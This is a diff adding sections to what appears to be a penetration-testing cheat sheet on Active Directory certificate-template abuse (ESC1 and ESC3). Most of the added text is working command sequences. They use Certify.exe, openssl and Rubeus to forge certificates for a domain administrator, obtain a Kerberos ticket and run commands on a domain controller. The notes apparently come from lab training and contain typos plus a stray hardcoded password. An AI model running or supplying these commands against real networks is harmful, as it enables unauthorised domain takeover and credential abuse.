@@ -271,12 +271,72 @@ C:> Certify.exe cas
 
 # Enumerate Templatesa
 C:> Certify.exe find
+# Interesting Fields on Result
+#      CA Name: Usefull for ESC1
+#      TemplateName: The name itself :-)
+#      Permissions
+#          Enrollment Rights: Grups or User with rights. This ones canrequest certificates for any
+#          Owner, WriteOwner Principals, etc...
+#      msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
 
 # Enumerate Vulnerable Tmeplates
 C:> Certify.exe find /vulnerable
 ```
 #### ESC1
+```powershell
+# Generating a certificate for any user, it's possible to request TGT on behalf
+#  of the user the cert been generated
+# List templates with msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
+C:> Certify.exe find /enrolleeSuppliesSubject
+
+# Request certificate for Domain Admin (PEM format)
+C:> Certify.exe request /ca:<CA_name> /template:"<template_name>" /altname:administrator
+# Prints the cert, need to save it on file. Copy text between:
+#       -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE-----
+
+# Convert from PEM to PFX. Using openssl
+C:> openssl.exe pkcs12 -in <pem_file.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
+                       -export -out <out_file.pfx>
+
+# Use Rubeus to request TGT for DA Admin
+C:> Rubeus.exe asktgt /user:administrator /certificate:<exported_certificate>.pfx 
+                      /password:<export_password_put_before> /ptt
+                  
+# Got privileges
+C:> winrs -r:dcorp-dc whoami
+```
 
 #### ESC3
+```powershell
+# Some Templates have policies to allow other Templates to generate certificates
+#  By this technique can generate a cert for a user using a certificate
+
+
+# Enumerate vulnerable templates 
+C:> Certify.exe find /vulnerable
+# Interesting to see pkiextendedkeyusage : Certificate Request Agent
+
+# Need to find another template with EKU that allows for domain autentication and application
+#  of certificate request agent. Then can request certificate as any user. Like ESC1
+C:> Certify.exe find
+# Search for the one with 'Application Policies : Certificate Request Agent'
+
+# Request an enrollment agent certificat e from first template and save to file
+C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Agent
+
+# Convert to PFX
+C:> openssl.exe pkcs12 -in <file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <out_file>.pfx
+
+# Request a certificate for DA from the second cert found using this generated one
+C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Users /onbehalfof:<domain>\administrator 
+                        /enrollcert:esc3-agent.pfx /enrollcertpw:<password>
+
+# Convert to PFX
+C:> openssl.exe pkcs12 -in <in_file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <out_file>.pfx
+
+# Request TGT aS DOMAIN ADMIN
+c:> Rubeus.exe asktgt /user:administrator /certificate:<OOUT_fILE_PREVIOUS_STEP>.pfx /password:<pass_previous_step>SecretPass@123 /ptt
+```
+
 #### ESC6
 
